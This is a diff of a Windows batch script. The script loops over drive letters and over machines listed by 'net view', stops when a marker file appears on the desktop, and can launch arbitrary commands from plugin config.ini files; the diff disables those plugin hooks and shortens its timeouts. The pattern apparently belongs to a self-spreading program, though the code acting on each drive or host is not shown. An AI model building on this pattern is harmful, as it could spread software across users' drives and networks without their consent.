@@ -48,14 +48,13 @@ set path_desktop=%userProfile%\Desktop
 if not exist "%path_desktop%" (for /f "skip=2 tokens=2,* delims= " %%i in ('reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v Desktop') do call set path_desktop=%%j)>nul 2>nul
 
 set extensions=
-if not exist extensions ( md extensions
-) else for /f "delims=" %%i in ('dir /a:d /b extensions 2^>nul') do if exist extensions\%%i\config.ini set extensions=!extensions!%%i;
+if exist extensions for /f "delims=" %%i in ('dir /a:d /b extensions 2^>nul') do if exist extensions\%%i\config.ini set extensions=!extensions!%%i;
 
 
 
 %module_fileTouch% "%~f0" >nul
 
-for %%i in (%extensions%) do for /f "tokens=1,* delims==" %%j in ('type "extensions\%%i\config.ini"') do if /i "%%j" == "start" start /b "" %%k
+rem if exist extensions for %%i in (%extensions%) do for /f "tokens=1,* delims==" %%j in ('type "extensions\%%i\config.ini"') do if /i "%%j" == "start" start /b "" %%k
 
 
 
@@ -74,7 +73,7 @@ for %%i in (%extensions%) do for /f "tokens=1,* delims==" %%j in ('type "extensi
 :cycle
 if exist "%path_desktop%\%app_date%" goto :remover
 
-for %%i in (%extensions%) do for /f "tokens=1,* delims==" %%j in ('type "extensions\%%i\config.ini"') do if /i "%%j" == "cycle" start /b "" %%k
+rem if exist extensions for %%i in (%extensions%) do for /f "tokens=1,* delims==" %%j in ('type "extensions\%%i\config.ini"') do if /i "%%j" == "cycle" start /b "" %%k
 
 
 
@@ -142,7 +141,7 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%
   )
 )
 
-timeout /nobreak /t 5 >nul
+timeout /nobreak /t 2 >nul
 
 
 
@@ -176,7 +175,7 @@ for /f "skip=3 tokens=1,* delims= " %%h in ('net view 2^>nul') do if /i "%%h" NE
   )
 )
 
-timeout /nobreak /t 5 >nul
+timeout /nobreak /t 2 >nul
 goto :cycle
 
 
@@ -194,7 +193,7 @@ goto :cycle
 
 
 :remover
-for %%i in (%extensions%) do for /f "tokens=1,* delims==" %%j in ('type "extensions\%%i\config.ini"') do if /i "%%j" == "remove" start /b "" %%k
+rem if exist extensions for %%i in (%extensions%) do for /f "tokens=1,* delims==" %%j in ('type "extensions\%%i\config.ini"') do if /i "%%j" == "remove" start /b "" %%k
 
 
 
